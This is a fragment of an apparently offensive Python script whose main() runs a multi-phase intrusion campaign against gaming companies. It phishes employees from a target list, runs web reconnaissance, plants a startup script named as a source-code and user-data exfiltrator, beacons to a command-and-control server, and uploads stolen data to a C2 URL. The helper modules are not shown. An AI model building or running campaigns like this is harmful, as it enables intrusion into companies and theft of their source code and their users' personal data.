...
def main():
    """
    Main function to run the gaming_company_campaign campaign.
    """
    print(f"[*] Starting gaming_company_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("gaming_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target gaming_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/source_code_and_user_data_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-GAMING_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("source_code_and_user_data/source_code_and_user_data.zip", "https://c2.example.com/upload")
    run_tool("payloads/source_code_and_user_data_exfiltrator.py")
